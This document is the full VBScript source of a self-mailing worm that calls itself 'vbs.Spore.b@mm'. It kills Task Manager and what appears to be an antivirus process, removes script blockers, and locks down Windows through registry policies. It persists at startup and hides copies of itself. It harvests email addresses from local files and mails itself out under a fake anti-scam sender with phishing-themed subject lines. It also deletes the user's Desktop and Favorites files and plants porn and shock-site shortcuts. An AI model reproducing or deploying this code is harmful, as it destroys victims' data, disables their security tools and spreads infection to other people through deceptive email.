
              Rem  vbs.Spore.b@mm  
                '  ==============


Option Explicit
Dim Wmi, ScriptBlocker, WShell, Fso, DrvType, WinFolder, RndNum, SysFolder
Dim RegKey, RegValue, RegKey2, RegValue2, RegKey3, RegValue3, AppPath, AppName
Dim BackUpPath, BackUpName, BackUpPath2, BackUpName2, DesktopPath, FavoritesPath 
Dim DropVbsFile, DropRegFile, DropRegFile2, DropRegFile3, HideFolder, NavProcess
Dim Drives, Drive, Folder, Files, File, SrchExten, SourceCode, AllSourceCode, TxtLen
Dim MailVictim, TxtCnt, SubFolders, SubFolder, RndNum2, Mail_Subject, Fake_EmailName
Dim Mail_Body, CdoMail, UrlName(10), UrlLink(10), X, UrlShortcut, LineName, CharName  
Dim RndNum3, ScriptName, RndNum4, ErrorName, RndNum5, CodeName, RndNum6, SourceName  
Dim Crlf, VxMsg, Spore_b, AllSporeSource


Set Wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2") 
For Each ScriptBlocker In Wmi.ExecQuery("Select * from Win32_Product") 
On Error Resume Next
If Instr(ScriptBlocker.Name,"Script") And Instr(ScriptBlocker.Name,"Block") Then 
ScriptBlocker.UnInstall() 
End If 
Next

Set WShell = CreateObject("WScript.Shell")
Set Fso = CreateObject("Scripting.FileSystemObject")

If (Fso.DriveExists("C:\")) <> "" Then
DrvType = "C:\"
End If

If (Fso.FolderExists(DrvType & "WINDOWS")) <> "" Then
WinFolder = "WINDOWS"
ElseIf (Fso.FolderExists(DrvType & "WINNT")) <> "" Then
WinFolder = "WINNT"
Else
WScript.Quit
End If

Randomize
RndNum = Int((2 * Rnd) + 1)
Select Case RndNum
Case 1
SysFolder = "\System"
Case 2
SysFolder = "\System32"
End Select

RegKey = "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\"
RegValue = WShell.RegRead(RegKey & "Spore.b")
RegKey2 = "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\"
RegValue2 = WShell.RegRead(RegKey2 & "RestrictRun")
RegKey3 = "HKCU\Software\Microsoft\Windows\SysBIOS\Virii\Spore.b\"
RegValue3 = WShell.RegRead(RegKey3 & "Sys_Infected")

AppPath = DrvType & WinFolder & SysFolder
AppName = "Scmhlpr.vbs"
BackUpPath = DrvType & WinFolder & "\AppLogs" 
BackUpName = "Applog32.vbs"
BackUpPath2 = "C:\Program Files\WindowsUpdate\Wuauclt.tmp"
BackUpName2 = "dwnldscn.vbs"

DesktopPath = WShell.SpecialFolders("Desktop")
FavoritesPath = WShell.SpecialFolders("Favorites")

If Not (Fso.FileExists(AppPath & "\" & "Winmgmt32.vbs")) Then
Set DropVbsFile = Fso.CreateTextFile(AppPath & "\" & "Winmgmt32.vbs")
DropVbsFile.WriteLine ""
DropVbsFile.WriteLine "  'Vbs File Droped By : Vbs.Spore.b@mm"
DropVbsFile.WriteLine ""
DropVbsFile.WriteLine " Dim StopProcess"
DropVbsFile.WriteLine ""
DropVbsFile.WriteLine "Do"
DropVbsFile.WriteLine "For Each StopProcess In GetObject" & "(""winmgmts:"")" & ". _"
DropVbsFile.WriteLine " ExecQuery" & "(""select name from Win32_Process where name = 'Taskmgr.exe'"")"
DropVbsFile.WriteLine " StopProcess.Terminate (0)"
DropVbsFile.WriteLine "Next"
DropVbsFile.WriteLine "Loop"
DropVbsFile.Close
Wshell.Run AppPath & "\" & "Winmgmt32.vbs"
Else
Wshell.Run AppPath & "\" & "Winmgmt32.vbs"  
End If

If RegValue = "" Then
Set DropRegFile = Fso.CreateTextFile(AppPath & "\" & "ActiveUser32.reg")
DropRegFile.WriteLine "REGEDIT4"
DropRegFile.WriteLine " [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]"
DropRegFile.WriteLine " ""Spore.b""=""\""" & DrvType & "\" & WinFolder & "\" & SysFolder & "\\" & AppName & "\"""""
DropRegFile.Close
Wshell.Run "regedit /s " & AppPath & "\" & "ActiveUser32.reg"  
End If

If RegValue2 <> "1" Then
Set DropRegFile2 = Fso.CreateTextFile(AppPath & "\" & "Win32Reg.reg")
DropRegFile2.WriteLine "REGEDIT4"
DropRegFile2.WriteLine ""
DropRegFile2.WriteLine " [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]"
DropRegFile2.WriteLine "  ""RestrictRun""" & " = " & """1"""
DropRegFile2.WriteLine ""
DropRegFile2.WriteLine " [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun]"
DropRegFile2.WriteLine "  ""1""" & " = " & """notepad.exe"""
DropRegFile2.WriteLine "  ""2""" & " = " & """wordpad.exe"""
DropRegFile2.WriteLine "  ""3""" & " = " & """write.exe"""
DropRegFile2.WriteLine "  ""4""" & " = " & """wuauclt.exe"""
DropRegFile2.Close
Wshell.Run "regedit /s " & AppPath & "\" & "Win32Reg.reg"  
End If

If RegValue3 <> "vbs.Spore.b@mm" Then
Set DropRegFile3 = Fso.CreateTextFile(AppPath & "\" & "MsMisc.reg")
DropRegFile3.WriteLine "REGEDIT4"
DropRegFile3.WriteLine ""
DropRegFile3.WriteLine " [HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\SysBIOS]"
DropRegFile3.WriteLine " [HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\SysBIOS\Virii]"
DropRegFile3.WriteLine " [HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\SysBIOS\Virii\Spore.b]"
DropRegFile3.WriteLine "  ""Sys_Infected""" & "=" & """vbs.Spore.b@mm"""
DropRegFile3.WriteLine ""
DropRegFile3.WriteLine " [HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]"
DropRegFile3.WriteLine "  ""Window Title""" & "=" & """vbs.Spore.b@mm (c) 2004"""
DropRegFile3.WriteLine ""
DropRegFile3.WriteLine " [HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]"
DropRegFile3.WriteLine "  ""DisableRegistryTools""" & "=dword:00000001"
DropRegFile3.WriteLine ""
DropRegFile3.WriteLine " [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]"
DropRegFile3.WriteLine "  ""NoFolderOptions""" & "=dword:00000001"
DropRegFile3.WriteLine "  ""NoWinKeys""" & "=dword:00000001"
DropRegFile3.WriteLine "  ""NoViewContextMenu""" & "=dword:00000001"
DropRegFile3.WriteLine "  ""NoClose""" & "=dword:00000001"
DropRegFile3.WriteLine "  ""NoSetFolders""" & "=dword:00000001"
DropRegFile3.WriteLine "  ""NoDrives""" & "=dword:03ffffff"
DropRegFile3.WriteLine "  ""NoRun""" & "=dword:00000001"
DropRegFile3.WriteLine "  ""NoFind""" & "=dword:00000001"
DropRegFile3.Close
Wshell.Run "regedit /s " & AppPath & "\" & "MsMisc.reg"  
End If

If Not (Fso.FileExists(AppPath & "\" & AppName)) Then 
Fso.CopyFile WScript.ScriptFullName, AppPath & "\" & AppName
End If

If Not (Fso.FolderExists(BackUpPath)) Then 
Fso.CreateFolder (BackUpPath)
Fso.CopyFile WScript.ScriptFullName, BackUpPath & "\" & BackUpName
Set HideFolder = Fso.GetFolder(BackUpPath)
HideFolder.Attributes = 34
End If

If Not (Fso.FolderExists(BackUpPath2)) Then 
Fso.CreateFolder (BackUpPath2)
Fso.CopyFile WScript.ScriptFullName, BackUpPath2 & "\" & BackUpName2
Set HideFolder = Fso.GetFolder(BackUpPath2)
HideFolder.Attributes = 34
End If

For Each NavProcess In GetObject("winmgmts:"). _
ExecQuery("select name from Win32_Process where name = 'ccApp.exe'")
NavProcess.Terminate (0)
Next

Set Drives = Fso.Drives
For Each Drive In Drives
If Drive.DriveType = 2 Or Drive.DriveType = 3 Then
DoSearchIn(Drive)
End If
Next

Lame_Playloads()
Wshell.Run "ccApp.exe" 
ScriptError_Msg() 
Anti_Delete()

Function DoSearchIn(Path)
On Error Resume Next

Set Fso = CreateObject("Scripting.FileSystemObject")
Set Folder = Fso.GetFolder(Path)
Set Files = Folder.Files
For Each File In Files

SrchExten = Fso.GetExtensionName(File.Path)
SrchExten = LCase(SrchExten)
If (SrchExten = "htt") Or (SrchExten = "htm") Or (SrchExten = "html") _
Or (SrchExten = "hta") Or (SrchExten = "hte") Or (SrchExten = "htx") _
Or (SrchExten = "shtml") Or (SrchExten = "stm") Or (SrchExten = "asp")  _
Or (SrchExten = "xml") Or (SrchExten = "doc") Or (SrchExten = "rtf") _
Or (SrchExten = "txt") Then

Set SourceCode = Fso.OpenTextFile(File.Path, 1)
AllSourceCode = SourceCode.ReadAll
SourceCode.Close
For TxtLen = 1 To Len(AllSourceCode)
If Mid(AllSourceCode, TxtLen, 7) = "mailto:" Then
MailVictim = ""
TxtCnt = 0
Do While Mid(AllSourceCode, TxtLen + 7 + TxtCnt, 1) <> """"
MailVictim = MailVictim + Mid(AllSourceCode, TxtLen + 7 + TxtCnt, 1)
TxtCnt = TxtCnt + 1
Loop

EmailTo(File.Path)
End If
Next
SourceCode = ""
AllSourceCode = ""
MailVictim = ""
End If
Next
Set SubFolders = Folder.SubFolders
For Each SubFolder In SubFolders
DoSearchIn(SubFolder.Path)
Next
End Function

Function EmailTo(MailTo)
On Error Resume Next

Randomize
RndNum2 = Int((10 * Rnd) + 1)
Select Case RndNum2
Case 1
Mail_Subject = "Fw: Reminder to be aware of internet scams" 
Case 2
Mail_Subject = "Re: Have you been a victim to internet scams" 
Case 3
Mail_Subject = "A friendly reminder to ALL online bank users"   
Case 4
Mail_Subject = "Fw: Dont be another victim..!!" 
Case 5
Mail_Subject = "PHISHING the new way of internet banking scams" 
Case 6
Mail_Subject = "Re: Help stop the internet scammers" 
Case 7
Mail_Subject = "Fw: WARNING are a online banker..??" 
Case 8
Mail_Subject = "Re: Gone phishing online.?? Well others have.!!" 
Case 9
Mail_Subject = "Have you been hooked by an online PHISHERMAN..???"  
Case 10
Mail_Subject = "Fw: Could you tell if you have been scammed online.??" 
End Select

Fake_EmailName = "scamalert@antiscam.com"

Mail_Body = " To whom it may concern, <BR> <BR>" & _
 " We at antiscam.com are just warning all the online banking account users to watch out for suspicious <BR>" & _
 " emails and web sites. If you would like to know more about how to report and avoid being a victim <BR>" & _
 " to another new internet scam then please read the attached file. <BR> <BR>" & _
 "     Thank you for your time." 

Set CdoMail = CreateObject("CDO.Message")
With CdoMail
.To = MailVictim
.From = Fake_EmailName
.Subject = Mail_Subject
.HTMLBody = Mail_Body
.AddAttachment (AppPath & "\" & AppName)
.Send
End With
Set CdoMail = Nothing
End Function

Function Lame_Playloads()
If FavoritesPath & "\" <> "" Then
Fso.DeleteFile (FavoritesPath & "\" & "*.*")
AddNewUrls()
Else
AddNewUrls()
End If

If DesktopPath & "\" <> "" Then
Fso.DeleteFile (DesktopPath & "\" & "*.*")
End If
End Function

Function AddNewUrls()
 UrlName(1) = "100% Free porn pictures (All you can see for free..!!)"
 UrlLink(1) = "http://pictures-free.org/"
 UrlName(2) = "Click Here..!! (for all your sleazy needs)"
 UrlLink(2) = "http://www.sleazepit.com"
 UrlName(3) = "Your free daily porn pictures"
 UrlLink(3) = "http://www.porn-cam.com"
 UrlName(4) = "Yummy Pink Bits"
 UrlLink(4) = "http://echo.starletse.com/nav/mp/pkic.html"
 UrlName(5) = "All You Can View"
 UrlLink(5) = "http://www.xnxx.com/free.shtml"
 UrlName(6) = "Alot-o-Pussy"
 UrlLink(6) = "http://www.link-o-rama.com/"
 UrlName(7) = "Gallery-o-Slutz"
 UrlLink(7) = "http://www.xpirin.com/"
 UrlName(8) = "Mixed Free Rotten Shit"
 UrlLink(8) = "http://www.rotten.com/"
 UrlName(9) = "Can You Handle Life"
 UrlLink(9) = "http://www.ogrish.com"
 UrlName(10) = "Free Allsorts of Junk"
 UrlLink(10) = "http://www.consumptionjunction.com/home.asp"
   
For X = 1 To 10
Set UrlShortcut = WShell.CreateShortcut(FavoritesPath & "\" & UrlName(X) & ".url")
UrlShortcut.targetpath = UrlLink(X)
UrlShortcut.save
Next
End Function

Function ScriptError_Msg()
Randomize
RndNum3 = Int((2 * Rnd) + 1)
Select Case RndNum3
Case 1
ScriptName = "wscript.exe" 
Case 2
ScriptName = "cscript.exe"
End Select

Randomize
LineName = Int(Rnd * 500)
CharName = Int(Rnd * 1000)

Randomize
RndNum4 = Int((5 * Rnd) + 1)
Select Case RndNum4
Case 1
ErrorName = "Expected end of statement" 
Case 2
ErrorName = "Object required: 'Virus Scan..!!'"
Case 3
ErrorName = "Expected 'System Update..!!'"  
Case 4
ErrorName = "Syntax error"
Case 5
ErrorName = "Unterminated string constant"
End Select

Randomize
RndNum5 = Int((10 * Rnd) + 1)
Select Case RndNum5
Case 1
CodeName = "V!RU$ !nFeCt!oN" 
Case 2
CodeName = "vbs.Spore.b@mm"
Case 3
CodeName = "y0u @sSh0l3"
Case 4
CodeName = "To0 l@t3 $uCk3r"
Case 5
CodeName = "DaMaGe !s d0n3"
Case 6
CodeName = "$yst3m_0v3rl0aD"
Case 7
CodeName = "$yst3m_!nFeCt!oN"
Case 8
CodeName = "$yst3m_3rRoR"
Case 9
CodeName = "BufF3r_Ov3rFl0w"
Case 10
CodeName = "FaRr-Qu3 Lo0s3r"
End Select

Randomize
RndNum6 = Int((2 * Rnd) + 1)
Select Case RndNum6
Case 1
SourceName = "Microsoft VBScript compilation error" 
Case 2
SourceName = "Microsoft VBScript runtime error"
End Select

Crlf = Chr(13) & Chr(10)

VxMsg = "Script: " & ScriptName & Crlf 
VxMsg = VxMsg & "Line: " & LineName & Crlf
VxMsg = VxMsg & "Char: " & CharName & Crlf
VxMsg = VxMsg & "Error: " & ErrorName & Crlf
VxMsg = VxMsg & "Code: " & CodeName & Crlf
VxMsg = VxMsg & "Source: " & SourceName & Crlf
MsgBox VxMsg, VbCritical, "Windows Script Host"
End Function

Function Anti_Delete()
Set Spore_b = Fso.OpenTextFile(WScript.ScriptFullName, 1)
AllSporeSource = Spore_b.ReadAll
Spore_b.Close

Do
If (Fso.FileExists(WScript.ScriptFullName)) = False Then
Set Spore_b = Fso.CreateTextFile(WScript.ScriptFullName, True)
Spore_b.Write AllSporeSource
Spore_b.Close 
End If
Loop 
End Function